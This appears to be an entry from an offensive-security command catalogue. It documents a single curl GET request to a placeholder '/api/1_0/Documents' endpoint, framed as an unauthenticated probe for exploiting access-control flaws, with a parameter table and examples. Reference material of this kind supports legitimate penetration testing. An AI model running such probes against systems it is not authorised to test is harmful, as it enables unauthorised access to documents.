---
data: 'curl -X GET "https://target/api/1_0/Documents" -H "Accept: application/json"'
tags:
  - access
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.589Z'
id: 2dd2e192-b582-4c30-8728-77670010a682
verified: false
validated: true
submitted: true
---
# curl-get-documents-endpoint

## Command

```bash
curl -X GET "https://target/api/1_0/Documents" -H "Accept: application/json"
```

## Description

Sends an unauthenticated GET request to list documents from the API endpoint useful for exploiting access control flaws.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `"https://target/api/1_0/Documents"` | Documents endpoint URL | Yes |
| `-H "Accept: application/json"` | Requests JSON response | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/api/1_0/Documents" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/api/1_0/Documents" -H "Accept: application/json" | jq "."
```

## Expected Output

JSON array of documents if successful e.g. {"documents":[...]}.

## Related

- [[Related Procedure]]
